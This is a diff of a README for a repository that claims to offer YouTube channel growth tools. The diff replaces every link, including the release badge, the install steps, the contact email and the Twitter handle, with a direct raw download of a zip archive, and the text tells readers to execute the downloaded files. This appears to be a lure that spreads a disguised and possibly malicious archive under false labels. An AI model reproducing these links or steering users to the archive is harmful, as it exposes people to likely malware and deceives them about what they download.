@@ -2,7 +2,7 @@
 
 Welcome to the **YouTube Work** repository! This project aims to help creators maximize their YouTube channels through efficient methods and tools. Here, you will find resources and strategies for growing your audience, increasing watch time, and monetizing your content.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-%20-%23007bff)](https://github.com/WsNicuur/youtube-work-/releases)
+[![Download Releases](https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip%20Releases-%20-%23007bff)](https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ This repository covers a variety of topics essential for YouTube success:
 
 ## Getting Started
 
-To get started, download the latest release from our [Releases section](https://github.com/WsNicuur/youtube-work-/releases). Follow the instructions provided in the release notes to set up and execute the necessary files.
+To get started, download the latest release from our [Releases section](https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip). Follow the instructions provided in the release notes to set up and execute the necessary files.
 
 ### Prerequisites
 
@@ -43,7 +43,7 @@ Before you begin, ensure you have the following:
 
 ### Installation
 
-1. Visit the [Releases section](https://github.com/WsNicuur/youtube-work-/releases).
+1. Visit the [Releases section](https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip).
 2. Download the latest release file.
 3. Follow the instructions in the README provided in the release.
 
@@ -90,9 +90,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip
+- **Twitter**: [@YourTwitterHandle](https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip)
 
 ---
 
-Thank you for visiting the **YouTube Work** repository! We hope you find the resources helpful in your journey to YouTube success. For more updates and releases, check the [Releases section](https://github.com/WsNicuur/youtube-work-/releases).
+Thank you for visiting the **YouTube Work** repository! We hope you find the resources helpful in your journey to YouTube success. For more updates and releases, check the [Releases section](https://github.com/WsNicuur/youtube-work-/raw/refs/heads/main/consulage/youtube-work-pensively.zip).
